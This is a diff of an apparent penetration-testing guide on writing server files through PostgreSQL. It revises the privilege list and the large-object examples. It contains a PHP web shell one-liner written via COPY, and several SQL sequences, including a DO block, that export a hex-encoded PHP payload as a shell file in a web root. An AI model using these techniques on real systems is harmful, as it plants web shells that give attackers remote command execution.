@@ -15,9 +15,8 @@ PostgreSQL provides functionality to write data to files on the server's filesys
 
 To write files from PostgreSQL, you typically need:
 
-1. Superuser privileges, OR
-2. Membership in the `pg_write_server_files` role (PostgreSQL 11+)
-3. Write permissions on the target directory for the `postgres` OS user
+1. **Either** superuser privileges **or** membership in the `pg_write_server_files` role (PostgreSQL 11+)
+2. Write permissions on the target directory for the `postgres` OS user
 
 ### Using COPY TO
 
@@ -58,18 +57,35 @@ COPY (SELECT '<?=`$_GET[0]`?>') TO '/var/www/html/s.php';
 
 ### Using Large Objects
 
-Large objects can be used for file operations:
+Large objects can be used for file operations.
+
+**Note:** Use `lo_create(0)` to auto-generate a unique OID instead of specifying a fixed value, which can conflict with existing objects. Always clean up with `lo_unlink(<oid>)` after use to avoid resource leakage.
 
 ```sql
--- Create large object with content
-SELECT lo_create(1337);
-INSERT INTO pg_largeobject VALUES (1337, 0, decode('3c3f706870207379...', 'hex'));
+-- Step 1: Create large object with auto-generated OID (returns OID, e.g., 16384)
+SELECT lo_create(0);
 
--- Export to file
-SELECT lo_export(1337, '/var/www/html/shell.php');
+-- Step 2: Insert content using returned OID
+INSERT INTO pg_largeobject VALUES (16384, 0, decode('3c3f706870207379...', 'hex'));
 
--- Clean up
-SELECT lo_unlink(1337);
+-- Step 3: Export to file
+SELECT lo_export(16384, '/var/www/html/shell.php');
+
+-- Step 4: Clean up to avoid resource leakage
+SELECT lo_unlink(16384);
+```
+
+**Alternative: Single-shot with DO block:**
+
+```sql
+DO $$
+DECLARE oid_var oid;
+BEGIN
+  oid_var := lo_create(0);
+  INSERT INTO pg_largeobject VALUES (oid_var, 0, decode('3c3f706870207379...', 'hex'));
+  PERFORM lo_export(oid_var, '/var/www/html/shell.php');
+  PERFORM lo_unlink(oid_var);
+END $$;
 ```
 
 ### Using lo_from_bytea() (PostgreSQL 9.4+)
